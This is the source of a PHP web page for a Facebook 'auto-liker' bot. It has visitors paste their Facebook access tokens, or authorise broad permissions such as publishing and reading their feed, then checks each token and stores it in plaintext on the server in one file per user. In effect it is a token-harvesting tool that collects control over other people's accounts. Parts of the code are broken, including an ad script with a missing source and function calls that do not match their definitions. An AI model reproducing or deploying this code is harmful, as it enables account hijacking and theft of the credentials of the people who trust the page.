
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
HABIB KHAAN
</title><link rel="stylesheet" type="text/css" href="ch.css" media="all,handheld"/><link rel="shortcut icon" href="">
 <script type=text/javascript>
 var _cpp= _cpp || [];
  _cpp['username']    = "HABIB KHAAN";
  _cpp['pop_type']    = "2";
  _cpp['onePer']    = "0";
  _cpp['freq']        = "20";   
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src =
var cs = document.getElementsByTagName('script')[0];
cs.parentNode.insertBefore(hs, cs);
})();</script>
<!--- END OF CPX24 CODE --->



<?php session_start();

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$khaan[]=$b.'='.$c;
}
	$true='?'.implode('&',$khaan);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY -=[ HABIB KHAAN ]=-',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('khaan')){

        mkdir('khaan');
}

if($bb){

	$blue=fopen('khaan/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('khaan/'.$id)){

	$file=file_get_contents('khaan/'.$id);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('khaan/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('khaan/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('khaan/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('khaan/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('khaan/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('khaan/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '
<div id="bottom-content">
<div id="navigation-menu">
<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
</div><br/>
<br><font color="white"> Welcome :</font><font color="yellow"> '.$nm.' </font></br>
<font color="white"> Activate Your Bot My Dear Friend </font></br>
<li>
<li>
<li>
<li>
<li>
<li>
<li>
<li>
<li>
<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="button button1" type="submit" value="Activate Bot">
</form>
</div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'
<div id="header">
<h1 class="heading">
<center><font size="90">
<script language="JavaScript" src="chsaab.js" size="520"></script></font></h1></div>
';
}

public function home(){
echo'
<div id="content">
<div class="post">
<div class="post-meta">
</div>

<div class="post-content">
<center><a href="https://fb.com/100006411673270"><ShADoOo>
<div class="post-content">
<center>
<a href="http://www.facebook.com/100006411673270"><img src="https://graph.facebook.com/100006411673270/picture?type=large" style="width:250px; height:250px;border: 4px;border-radius: 500%;" alt="aryan " title="aryan" class="thumbnail"><a href="http://www.facebook.com/100006411673270"><img src="https://graph.facebook.com/100006411673270/picture?type=large" style="width:250px; height:250px;border: 4px;border-radius: 500%;" alt="aryan " title="aryan" class="thumbnail"></a>
<span>
<br> CREATED BY !! HABIB KHAAN <br>
FOLLOW ME : <a href="http://www.facebook.com/100006411673270">CLICK HERE </a>
</span>
</div>
<div class="post-meta2">
<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2F100006411673270&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>

</div></div></div>

';
}

public function bwh(){
echo'
<div id="bottom-content">
<div id="navigation-menu">
<br>
<center><a href="http://www.m-autoliker.com/token.php?install=htc" target="_blank"><input class="button2" type="button" value="Allow Token"></a><font color="yellow"> - </font><a href="https://goo.gl/NkKRQ6" target="_blank"><input class="button2" type="button" value="Get Token"></a></center></br></center>
</div>

<div id="top-content">
<div id="search-form">

<form action="index.php" method="post"><input class="inp-text" type="text" style="height:28px;" name="token"> <input class="inp-btn" type="submit" style="height:28px;" value=" SUBMIT"></form></div></div></div>
';

$this->membEr();
}

public function membEr(){

	if(!is_dir('khaan')){

	mkdir('khaan');
}

$up=opendir('khaan');

	while($use=readdir($up)){

	if($use != '.' && $use != '..'){

	$user[]=$use;}
}

echo'

<div id="footer">
<font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color: red"> Bot Lovers : </font> <font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color="red">'.count($user).'</font><br>

<font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color: red"> Powered By : </font> <font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color="red">HABIB KHAAN</font>

</div>';

}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('khaan/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Token Expired</h2>";
			</script>';
        unset($_SESSION[key]);
        unlink('khaan/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Invalid Token Or Expired Token</h2>";
			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>